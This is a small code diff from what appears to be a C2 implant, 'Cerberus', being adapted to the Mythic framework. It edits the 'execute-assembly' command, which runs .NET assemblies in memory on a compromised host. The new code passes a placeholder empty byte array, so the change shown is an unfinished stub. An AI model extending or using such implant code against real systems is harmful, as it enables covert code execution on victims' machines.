@@ -6,9 +6,11 @@ namespace Cerberus.Commands
     {
         public override string Name => "execute-assembly";
 
-        public override string Execute(CerberusTask task)
+        public override string Execute(MythicTask task)
         {
-            return Internal.Execute.ExecuteAssembly(task.FileBytes, task.Arguments);
+            var Arguments = task.parameters.Split(' ');
+            var FileBytes = new byte[10];
+            return Internal.Execute.ExecuteAssembly(FileBytes, Arguments);
         }
     }
 }
